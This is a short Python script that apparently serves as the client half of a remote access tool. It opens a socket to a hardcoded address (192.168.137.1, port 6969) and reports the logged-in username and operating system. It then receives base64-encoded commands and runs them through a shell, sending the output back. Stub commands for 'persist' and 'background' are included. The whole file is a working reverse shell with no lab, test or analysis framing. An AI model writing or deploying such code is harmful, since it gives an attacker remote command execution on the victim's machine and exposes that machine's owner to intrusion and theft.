import os
import socket
import subprocess
import platform
from time import sleep
import base64

def inbound():
    message = ''
    while True:
        try:
            message = sock.recv(1024).decode()
            message = base64.b64decode(message)
            message = message.decode().strip()
            return (message)
        except Exception:
            sock.close()

def outbound(message):
    response = str(message)
    response = base64.b64encode(bytes(response,encoding='utf8'))
    sock.send(response)
def sesion_handler():
    try:
        sock.connect((host_ip,host_port))
        outbound(os.getlogin())
        sleep(1)
        op_sys = platform.uname()
        op_sys = (f'{op_sys[0]} {op_sys[2]}')
        outbound(op_sys)
        # outbound(ctypes.windll.shell32.is)
        while True:
            message = inbound()
            if message == 'exit':
                sock.close()
                break
            elif message == 'persist':
                pass
            elif message.split(" ")[0] == 'cd':
                try:
                    directory = str(message.split(" ")[1])
                    os.chdir(directory)
                    cur_dir = os.getcwd()
                    outbound(cur_dir)
                except FileNotFoundError:
                    outbound('[-]directory not found. Try Again')
                    continue
            elif message == 'background':
                pass
            elif message == 'help':
                pass

            else:
                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                output = command.stdout.read() + command.stderr.read()
                outbound(output.decode())
    except ConnectionRefusedError:
        pass

if __name__=='__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # host_ip = sys.argv[1]
        # host_port = int(sys.argv[2])
        host_ip = '192.168.137.1'
        host_port = 6969
        sesion_handler()
    except IndexError:
        print('[-]Command line argument missing...please enter it')
    except Exception as e:
        print(e)